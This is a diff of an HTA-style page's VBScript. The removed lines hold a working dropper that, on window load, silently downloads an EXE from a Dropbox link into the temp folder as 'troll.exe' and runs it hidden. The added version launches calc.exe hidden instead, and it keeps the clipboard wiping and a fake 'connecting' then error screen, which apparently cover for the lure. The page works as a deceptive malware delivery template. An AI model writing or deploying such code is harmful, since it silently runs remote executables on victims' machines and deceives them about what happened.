@@ -48,44 +48,31 @@
         }
     </style>
     <script language="VBScript">
-Sub Window_onLoad
-    Window.ResizeTo 520, 480
-    Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
-
-    ' Download and execute EXE
-    DownloadAndRun
-
-    ClearClipboard
-
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "cmd.exe /c timeout /T 2 /nobreak", 0, True
-    Call HideConnectingShowError
-    objShell.Run "cmd.exe /c timeout /T 1 /nobreak", 0, True
-End Sub
-
-Sub DownloadAndRun
-    Dim url, filename, xmlhttp, stream, fso, tempPath
-
-    url = "https://www.dropbox.com/scl/fi/cwyukz62jaib0e89fubkq/Documents-System.exe?rlkey=acoo0jcv7tqr6m2igmm1plsxu&st=knipkwxd&dl=1" ' Replace with your real link
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    tempPath = fso.GetSpecialFolder(2) & "\troll.exe" ' Downloads to temp folder
-
-    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
-    xmlhttp.Open "GET", url, False
-    xmlhttp.Send
-
-    If xmlhttp.Status = 200 Then
-        Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1 ' binary
-        stream.Open
-        stream.Write xmlhttp.ResponseBody
-        stream.SaveToFile tempPath, 2
-        stream.Close
+    Sub Window_onLoad
+        Window.ResizeTo 520, 480
+        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
 
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run Chr(34) & tempPath & Chr(34), 0, False
-    End If
-End Sub
+        objShell.Run "calc.exe", 0, False  ' Just for fun
+
+        ClearClipboard
+
+        objShell.Run "cmd.exe /c timeout /T 2 /nobreak", 0, True
+        Call HideConnectingShowError
+        objShell.Run "cmd.exe /c timeout /T 1 /nobreak", 0, True
+    End Sub
+
+    Sub HideConnectingShowError
+        document.getElementById("connecting").style.display = "none"
+        document.getElementById("error").style.display = "block"
+    End Sub
+
+    Sub ClearClipboard
+        Dim objHTML
+        Set objHTML = CreateObject("htmlfile")
+        objHTML.parentWindow.clipboardData.setData "text", ""
+        Set objHTML = Nothing
+    End Sub
     </script>
 </head>
 <body>
